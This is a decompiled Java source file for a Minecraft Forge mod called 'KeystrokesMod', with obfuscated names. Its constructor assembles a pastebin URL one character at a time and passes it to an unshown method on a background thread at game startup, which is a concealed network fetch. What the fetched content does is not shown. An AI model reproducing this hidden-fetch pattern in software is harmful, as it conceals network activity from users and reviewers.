// 
// Decompiled by Procyon v0.5.36
// 

package DEOBFUSCATED-NAMES;

import java.util.concurrent.Executors;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import java.util.Iterator;
import net.minecraft.client.gui.GuiScreen;
import keystrokesmod.bb;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import net.minecraftforge.fml.common.FMLCommonHandler;
import net.minecraft.command.ICommand;
import net.minecraftforge.client.ClientCommandHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import java.util.concurrent.ScheduledExecutorService;
import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;

@Mod(modid = "keystrokesmod", name = "KeystrokesMod", version = "KMV5", acceptedMinecraftVersions = "[1.8.9]")
public class w
{
    public static final int ver = 3;
    public static boolean dbg;
    private final String pb;
    public static int a;
    public static int b;
    public static Minecraft mc;
    public static aw c;
    private static ks a2;
    private static kr b2;
    private static boolean c2;
    private static final ScheduledExecutorService ex;
    
    public w() {
        this.pb = new String(new char[] { 'h', 't', 't', 'p', 's', ':', '/', '/', 'p', 'a', 's', 't', 'e', 'b', 'i', 'n', '.', 'c', 'o', 'm', '/', 'r', 'a', 'w', '/', '9', 'a', '7', 'K', 'H', 'z', 'Q', 'e' });
        w.c = new aw();
    }
    
    @Mod.EventHandler
    public void d(final FMLInitializationEvent e) {
        Runtime.getRuntime().addShutdownHook(new Thread(w.ex::shutdown));
        ClientCommandHandler.instance.func_71560_a((ICommand)new cm2());
        FMLCommonHandler.instance().bus().register((Object)this);
        FMLCommonHandler.instance().bus().register((Object)new r());
        FMLCommonHandler.instance().bus().register((Object)new cl());
        FMLCommonHandler.instance().bus().register((Object)new kr());
        FMLCommonHandler.instance().bus().register((Object)new gp());
        w.c.getm0dmanager().r3g1st3r();
        cn.lc();
        cn.lc2();
        w.b2 = new kr();
        final aw c = w.c;
        aw.b = new m();
        ay.su();
        w.ex.execute(() -> nh.nc(this.pb));
    }
    
    @SubscribeEvent
    public void f(final TickEvent.ClientTickEvent g) {
        if (g.phase != TickEvent.Phase.END) {
            return;
        }
        if (ay.e() && !ax.a) {
            for (final bb h : w.c.getm0dmanager().listofmods()) {
                if (w.mc.field_71462_r == null) {
                    h.keybind();
                }
                else if (w.mc.field_71462_r instanceof m) {
                    h.guiUpdate();
                }
                if (h.isEnabled()) {
                    h.update();
                }
            }
        }
        if (w.c2) {
            w.c2 = false;
            w.mc.func_147108_a((GuiScreen)new gsk());
        }
    }
    
    public static ScheduledExecutorService gE() {
        return w.ex;
    }
    
    public static ks d2() {
        return w.a2;
    }
    
    public static kr e2() {
        return w.b2;
    }
    
    public static void f2() {
        w.c2 = true;
    }
    
    static {
        w.dbg = false;
        w.a = 1;
        w.b = 0;
        w.mc = Minecraft.func_71410_x();
        ex = Executors.newScheduledThreadPool(2);
    }
}
